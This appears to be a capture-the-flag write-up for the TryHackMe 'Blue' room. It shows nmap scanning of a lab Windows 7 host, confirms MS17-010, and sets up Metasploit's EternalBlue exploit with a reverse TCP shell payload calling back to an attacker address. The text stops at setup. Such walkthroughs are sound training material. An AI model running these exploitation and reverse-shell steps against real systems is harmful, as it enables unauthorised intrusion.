# Blue:
>Deploy & hack into a Windows machine, leveraging common Misconfigurations issues.
`https://tryhackme.com/r/room/blue`

 IP `10.10.224.157`

 ------------------------------

### Recon
- use nmap to scan the open ports
`nmap -Pn -sC -sV -oN nmapfile 10.10.224.157`

```sh
PORT      STATE    SERVICE            VERSION
135/tcp   open     msrpc              Microsoft Windows RPC
139/tcp   open     netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open     ssl/ms-wbt-server?
|_ssl-date: 2024-08-02T22:18:22+00:00; +1d05h26m00s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2024-08-02T22:18:16+00:00
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2024-08-01T21:41:29
|_Not valid after:  2025-01-31T21:41:29
9415/tcp  filtered unknown
9595/tcp  filtered pds
49152/tcp open     msrpc              Microsoft Windows RPC
49153/tcp open     msrpc              Microsoft Windows RPC
49154/tcp open     msrpc              Microsoft Windows RPC
49158/tcp open     msrpc              Microsoft Windows RPC
49160/tcp open     msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:9b:af:e4:87:5b (unknown)
|_clock-skew: mean: 1d06h25m59s, deviation: 2h14m09s, median: 1d05h25m59s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-08-02T22:18:16
|_  start_date: 2024-08-02T21:41:28
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-08-02T17:18:16-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 926.88 seconds

```

- since we have smb seviec we can use ` nmap --script=smp* 10.10.224.157 `
- we know that is smb vuln ms17-010

```sh
# nmap --script=smb-vuln-ms17-010 10.10.224.157
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-01 12:49 EDT
Nmap scan report for 10.10.224.157
Host is up (0.12s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 17.47 seconds
```

### Gain Access
 - start metasploit | `msfconsole`
 - search for explot module path | `search msf smb-vuln-ms17-010.nse

 ```sh
Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption                   
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection                                                       
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce     
 ```
 
 - the code module path  [0] `exploit/windows/smb/ms17_010_eternalblue`
 - so now enter [0] | `use 0`
 - then use command `show options`
 ```sh
 sf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://do
                                             cs.metasploit.com/docs/using-metas
                                             ploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to u
                                             se for authentication. Only affect
                                             s Windows Server 2008 R2, Windows
                                             7, Windows Embedded Standard 7 tar
                                             get machines.
   SMBPass                         no        (Optional) The password for the sp
                                             ecified username
   SMBUser                         no        (Optional) The username to authent
                                             icate as
   VERIFY_ARCH    true             yes       Check if remote architecture match
                                             es exploit Target. Only affects Wi
                                             ndows Server 2008 R2, Windows 7, W
                                             indows Embedded Standard 7 target
                                             machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit
                                              Target. Only affects Windows Serv
                                             er 2008 R2, Windows 7, Windows Emb
                                             edded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thre
                                        ad, process, none)
   LHOST     10.10.2.138      yes       The listen address (an interface may be
                                         specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.
```
 - set RHOSTS to `10.10.224.157` | `set RHOST 10.10.224.157`
 - set payload options |`set payload windows/x64/shell/reverse_tcp`

